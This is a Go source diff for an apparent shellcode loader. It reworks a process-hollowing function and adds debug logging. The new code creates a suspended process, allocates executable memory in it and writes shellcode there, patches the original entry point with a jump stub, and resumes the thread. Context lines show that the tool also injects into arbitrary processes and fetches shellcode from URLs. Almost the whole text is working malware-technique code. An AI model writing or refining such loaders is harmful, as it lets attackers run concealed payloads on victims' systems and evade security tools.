@@ -90,7 +90,7 @@ func main() {
 			log.Fatalf("Failed to inject shellcode: %v", err)
 		}
 	} else if len(*hollowPath) > 0 {
-		if err := tryHollowExecutable(*hollowPath, shellcode); err != nil {
+		if err := tryHollowExecutable(*hollowPath, shellcode, *debug); err != nil {
 			log.Fatalf("Failed to hollow executable: %v", err)
 		}
 	} else {
@@ -281,7 +281,9 @@ func tryInjectShellCode(processID int, shellcode []byte) error {
 	return nil
 }
 
-func tryHollowExecutable(path string, shellcode []byte) error {
+func tryHollowExecutable(path string, shellcode []byte, debug bool) error {
+	debugLog(debug, "[+] Starting process hollowing for: %s", path)
+
 	_, err := os.Stat(path)
 	if err != nil {
 		return fmt.Errorf("invalid path: %v", err)
@@ -291,6 +293,8 @@ func tryHollowExecutable(path string, shellcode []byte) error {
 	createProcessA := kernel32.MustFindProc("CreateProcessA")
 	readProcessMemory := kernel32.MustFindProc("ReadProcessMemory")
 	writeProcessMemory := kernel32.MustFindProc("WriteProcessMemory")
+	virtualProtectEx := kernel32.MustFindProc("VirtualProtectEx")
+	virtualAllocEx := kernel32.MustFindProc("VirtualAllocEx")
 	resumeThread := kernel32.MustFindProc("ResumeThread")
 	ntdll := syscall.MustLoadDLL("ntdll.dll")
 	zwQueryInformationProcess := ntdll.MustFindProc("ZwQueryInformationProcess")
@@ -299,13 +303,14 @@ func tryHollowExecutable(path string, shellcode []byte) error {
 	processInfo := &syscall.ProcessInformation{}
 	pathArray := append([]byte(path), byte(0))
 
+	debugLog(debug, "[+] Creating suspended process")
 	ret, _, err := createProcessA.Call(
 		0,
 		uintptr(unsafe.Pointer(&pathArray[0])),
 		0,
 		0,
 		0,
-		0x4,
+		0x4, // CREATE_SUSPENDED
 		0,
 		0,
 		uintptr(unsafe.Pointer(startupInfo)),
@@ -314,10 +319,13 @@ func tryHollowExecutable(path string, shellcode []byte) error {
 	if ret == 0 {
 		return fmt.Errorf("CreateProcessA failed: %v", err)
 	}
+	debugLog(debug, "[+] Process created with PID: %d", processInfo.ProcessId)
 
 	pointerSize := unsafe.Sizeof(uintptr(0))
 	basicInfo := &PROCESS_BASIC_INFORMATION{}
 	tmp := 0
+
+	debugLog(debug, "[+] Querying process information")
 	_, _, err = zwQueryInformationProcess.Call(
 		uintptr(processInfo.Process),
 		0,
@@ -330,8 +338,13 @@ func tryHollowExecutable(path string, shellcode []byte) error {
 	}
 
 	imageBaseAddress := basicInfo.PebAddress + 0x10
+	debugLog(debug, "[+] PEB address: 0x%x", basicInfo.PebAddress)
+	debugLog(debug, "[+] Image base address location: 0x%x", imageBaseAddress)
+
 	addressBuffer := make([]byte, pointerSize)
 	read := 0
+
+	debugLog(debug, "[+] Reading process memory for image base")
 	_, _, err = readProcessMemory.Call(
 		uintptr(processInfo.Process),
 		imageBaseAddress,
@@ -344,28 +357,27 @@ func tryHollowExecutable(path string, shellcode []byte) error {
 	}
 
 	imageBaseValue := binary.LittleEndian.Uint64(addressBuffer)
-	addressBuffer = make([]byte, 0x200)
-	_, _, err = readProcessMemory.Call(
+	debugLog(debug, "[+] Image base: 0x%x", imageBaseValue)
+
+	// 分配新的内存空间
+	debugLog(debug, "[+] Allocating memory for shellcode of size: %d bytes", len(shellcode))
+	newMemory, _, err := virtualAllocEx.Call(
 		uintptr(processInfo.Process),
-		uintptr(imageBaseValue),
-		uintptr(unsafe.Pointer(&addressBuffer[0])),
-		uintptr(len(addressBuffer)),
-		uintptr(unsafe.Pointer(&read)),
+		0,
+		uintptr(len(shellcode)),
+		windows.MEM_COMMIT|windows.MEM_RESERVE,
+		windows.PAGE_EXECUTE_READWRITE,
 	)
-	if err != nil && err.Error() != "The operation completed successfully." {
-		return fmt.Errorf("ReadProcessMemory failed: %v", err)
+	if newMemory == 0 {
+		return fmt.Errorf("VirtualAllocEx failed: %v", err)
 	}
+	debugLog(debug, "[+] Allocated memory at: 0x%x", newMemory)
 
-	lfaNewPos := addressBuffer[0x3c : 0x3c+0x4]
-	lfanew := binary.LittleEndian.Uint32(lfaNewPos)
-	entrypointOffset := lfanew + 0x28
-	entrypointOffsetPos := addressBuffer[entrypointOffset : entrypointOffset+0x4]
-	entrypointRVA := binary.LittleEndian.Uint32(entrypointOffsetPos)
-	entrypointAddress := imageBaseValue + uint64(entrypointRVA)
-
+	// 写入shellcode到新分配的内存
+	debugLog(debug, "[+] Writing shellcode")
 	_, _, err = writeProcessMemory.Call(
 		uintptr(processInfo.Process),
-		uintptr(entrypointAddress),
+		newMemory,
 		uintptr(unsafe.Pointer(&shellcode[0])),
 		uintptr(len(shellcode)),
 		0,
@@ -374,11 +386,87 @@ func tryHollowExecutable(path string, shellcode []byte) error {
 		return fmt.Errorf("WriteProcessMemory failed: %v", err)
 	}
 
+	// 读取DOS头和NT头
+	headerBuffer := make([]byte, 0x1000)
+	_, _, err = readProcessMemory.Call(
+		uintptr(processInfo.Process),
+		uintptr(imageBaseValue),
+		uintptr(unsafe.Pointer(&headerBuffer[0])),
+		uintptr(len(headerBuffer)),
+		uintptr(unsafe.Pointer(&read)),
+	)
+	if err != nil && err.Error() != "The operation completed successfully." {
+		return fmt.Errorf("ReadProcessMemory failed for PE headers: %v", err)
+	}
+
+	// 获取原始入口点
+	lfaNewPos := headerBuffer[0x3c : 0x3c+0x4]
+	lfanew := binary.LittleEndian.Uint32(lfaNewPos)
+	entrypointOffset := lfanew + 0x28
+	entrypointOffsetPos := headerBuffer[entrypointOffset : entrypointOffset+0x4]
+	entrypointRVA := binary.LittleEndian.Uint32(entrypointOffsetPos)
+	entrypointAddress := imageBaseValue + uint64(entrypointRVA)
+
+	debugLog(debug, "[+] Original entry point RVA: 0x%x", entrypointRVA)
+	debugLog(debug, "[+] Original entry point address: 0x%x", entrypointAddress)
+
+	// 创建跳转代码到shellcode
+	jumpCode := []byte{
+		0x48, 0xB8, // mov rax,
+		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // <address>
+		0xFF, 0xE0, // jmp rax
+	}
+
+	// 将新内存地址写入跳转代码
+	binary.LittleEndian.PutUint64(jumpCode[2:], uint64(newMemory))
+
+	// 修改原始入口点的保护属性
+	var oldProtect uint32
+	debugLog(debug, "[+] Changing memory protection of original entry point")
+	ret, _, err = virtualProtectEx.Call(
+		uintptr(processInfo.Process),
+		uintptr(entrypointAddress),
+		uintptr(len(jumpCode)),
+		0x40, // PAGE_EXECUTE_READWRITE
+		uintptr(unsafe.Pointer(&oldProtect)),
+	)
+	if ret == 0 {
+		return fmt.Errorf("VirtualProtectEx failed: %v", err)
+	}
+
+	// 写入跳转代码
+	debugLog(debug, "[+] Writing jump code to original entry point")
+	_, _, err = writeProcessMemory.Call(
+		uintptr(processInfo.Process),
+		uintptr(entrypointAddress),
+		uintptr(unsafe.Pointer(&jumpCode[0])),
+		uintptr(len(jumpCode)),
+		0,
+	)
+	if err != nil && err.Error() != "The operation completed successfully." {
+		return fmt.Errorf("WriteProcessMemory failed for jump code: %v", err)
+	}
+
+	// 恢复内存保护
+	debugLog(debug, "[+] Restoring memory protection")
+	ret, _, err = virtualProtectEx.Call(
+		uintptr(processInfo.Process),
+		uintptr(entrypointAddress),
+		uintptr(len(jumpCode)),
+		uintptr(oldProtect),
+		uintptr(unsafe.Pointer(&oldProtect)),
+	)
+	if ret == 0 {
+		debugLog(debug, "[!] Warning: Failed to restore memory protection: %v", err)
+	}
+
+	debugLog(debug, "[+] Resuming thread")
 	_, _, err = resumeThread.Call(uintptr(processInfo.Thread))
 	if err != nil && err.Error() != "The operation completed successfully." {
 		return fmt.Errorf("ResumeThread failed: %v", err)
 	}
 
+	debugLog(debug, "[+] Process hollowing completed successfully")
 	return nil
 }
 
@@ -425,4 +513,11 @@ func getShellCode(shellcodeIn, shellcodeFile, shellcodeUrl *string) ([]byte, err
 	}
 
 	return nil, fmt.Errorf("please provide shellcode either directly (-i), from a file (-f) or from a url (-u)")
+}
+
+// 添加调试日志辅助函数
+func debugLog(debug bool, format string, v ...interface{}) {
+	if debug {
+		log.Printf(format, v...)
+	}
 }
